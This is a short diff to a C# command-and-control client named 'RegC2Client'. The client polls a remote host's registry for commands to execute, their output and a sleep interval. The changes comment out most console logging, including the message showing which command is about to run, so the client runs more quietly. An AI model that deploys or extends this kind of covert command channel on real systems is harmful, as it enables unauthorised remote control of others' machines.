@@ -20,12 +20,12 @@ namespace RegC2Client
             }
             catch (Exception ex)
             {
-                Console.WriteLine(ex.Message);
+                //Console.WriteLine(ex.Message);
                 return cmd;
             }
 
             cmd = myReg.GetValue("cmd").ToString();
-            Console.WriteLine("Command to execute:  {0}  ", cmd);
+            //Console.WriteLine("Command to execute:  {0}  ", cmd);
             myReg.Close();
 
             return cmd;
@@ -92,7 +92,7 @@ namespace RegC2Client
             catch (Exception ex)
             {
                 //Console.WriteLine(ex.Message);
-                Console.WriteLine("Failed to find new sleeptime... keeping it at 30");
+                //Console.WriteLine("Failed to find new sleeptime... keeping it at 30");
                 return sleepTime;
             }
 
@@ -150,7 +150,7 @@ namespace RegC2Client
                     string command = GetCommand(host, registrykey);
                     if (command == "Exit")
                     {
-                        Console.WriteLine("Shutting down...");
+                        Console.WriteLine("[+] Shutting down...");
                         return;
                     }
                     string lastOutput = GetOutput(host, registrykey);
